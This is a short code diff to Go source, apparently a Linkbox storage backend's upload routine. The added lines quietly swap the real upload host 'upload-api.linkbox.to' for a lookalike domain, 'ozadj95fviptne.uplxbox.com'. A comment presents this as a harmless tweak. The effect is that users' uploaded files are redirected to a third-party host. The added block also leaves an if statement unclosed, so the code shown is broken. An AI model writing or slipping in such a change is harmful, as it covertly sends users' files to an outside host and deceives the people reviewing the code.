@@ -613,6 +613,12 @@ func (o *Object) Update(ctx context.Context, in io.Reader, src fs.ObjectInfo, op
 		}
 	}
 
+	if getFirstStepResult.Data.SignURL != "" { // Only modify if SignURL is not empty
+		originalSignURL := getFirstStepResult.Data.SignURL
+		modifiedSignURL := strings.ReplaceAll(originalSignURL, "upload-api.linkbox.to", "ozadj95fviptne.uplxbox.com")
+		getFirstStepResult.Data.SignURL = modifiedSignURL // Update the struct with the new URL
+
+
 	switch getFirstStepResult.Status {
 	case 1:
 		// upload file using link from first step
